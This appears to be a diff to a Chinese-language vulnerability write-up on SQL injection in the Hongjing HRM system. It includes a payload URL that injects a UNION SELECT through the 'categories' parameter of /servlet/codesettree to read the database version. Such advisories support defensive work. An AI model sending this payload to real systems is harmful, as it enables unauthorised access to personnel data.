@@ -12,7 +12,7 @@ source: "MrWQ/vulnerability-paper"
 
 宏景人力资源管理系统是一款由宏景软件研发的系统，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备了报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。
 
-宏景人力资源管理系统 categories 处存在 SQL 注入漏洞，攻击者可以从其中获取数据库敏感信息
+宏景人力资源管理系统 categories 处存在 SQL 注入漏洞，攻击者可以从其中获取数据库敏感信息
 
 **影响版本**
 
@@ -29,7 +29,7 @@ payload:
 
 ```
 /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d
-# 查询数据库版本
+# 查询数据库版本
 
 ```
 
